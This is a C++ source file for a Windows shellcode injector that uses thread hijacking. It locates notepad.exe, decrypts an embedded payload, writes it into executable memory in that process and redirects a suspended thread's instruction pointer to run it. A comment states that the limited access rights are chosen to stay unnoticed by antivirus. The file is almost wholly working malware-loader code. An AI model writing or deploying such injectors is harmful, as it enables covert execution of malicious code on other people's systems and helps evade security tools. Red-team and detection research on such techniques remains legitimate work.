#include "ThreadHijackingInjection.h"
using namespace std;

typedef LPVOID (WINAPI * VirtualAlloc_t)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect);
	
typedef VOID (WINAPI * RtlMoveMemory_t)(
	VOID UNALIGNED *Destination, 
	const VOID UNALIGNED *Source, 
	SIZE_T Length);

typedef FARPROC (WINAPI * RtlCreateUserThread_t)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits,
	IN OUT PULONG StackReserved,
	IN OUT PULONG StackCommit,
	IN PVOID StartAddress,
	IN PVOID StartParameter OPTIONAL,
	OUT PHANDLE ThreadHandle,
	OUT PCLIENT_ID ClientId);

typedef NTSTATUS (NTAPI * NtCreateThreadEx_t)(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer);

void ThreadHijackingInjection::Inject() {
    freopen("debug.txt","w",stdout);
    LPVOID pRemoteCode = NULL;
    CONTEXT ctx;
    DWORD pid = 0;
    HANDLE h_proc = NULL, h_thread = NULL;

    // Find process and retrieve PID.
    pid = Injector::FindTarget(procName_);
    cout << "Payload Before decrypt: " << hex << payload_ << endl;
    // if PID wasn't found return.
    if (!pid) {
            cout << "PID of notepad was not found." << endl;
            cout << "Decryption key = " << endl;
            printf("%x", key_);
    }

    // open the process avoid asking all access. to remain unnoticed to AV.
    h_proc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                          PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
                          FALSE, pid);


    if(h_proc != nullptr){
        // Try finding thread inside the given process.
        h_thread = Injector::FindThread(pid);
        if(h_thread != NULL){
                cout << "Passed FindThread" << endl;
        }
        cout << "Suspended thread" << endl;

        // decrypt shellcode for injection
        Injector::Decrypt();
        
        // allocate mem inside address space of the given process.
        pRemoteCode = VirtualAllocEx(h_proc, NULL, payload_len_, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        cout << "VirtualAllocEx allocated at address: " << pRemoteCode << endl;

        cout << "Payload after decryption  " << payload_ << endl;
        // inject.
        WriteProcessMemory(h_proc, pRemoteCode, (PVOID) payload_, (SIZE_T) payload_len_, (SIZE_T *) NULL);
        
        ctx.ContextFlags = CONTEXT_FULL;

        // suspend running thread for injection.
        SuspendThread(h_thread);
        
        // retrive thread's context.
        GetThreadContext(h_thread, &ctx);

        // change RIP to inject code based on system (32 vs 64)
#ifdef _M_IX86
        ctx.Eip = (DWORD_PTR) pRemoteCode;
#else
        ctx.Rip = (DWORD_PTR) pRemoteCode;
#endif

        // set context.
        SetThreadContext(h_thread, &ctx);

        // resume thread.
        ResumeThread(h_thread);

        // close handles.
        CloseHandle(h_thread);
        CloseHandle(h_proc);
        cout << "Should have ended correctly." << endl;
    }
    
   else {
           cout << "Failed to OpenProcess on notepad.exe" << endl;
   }



}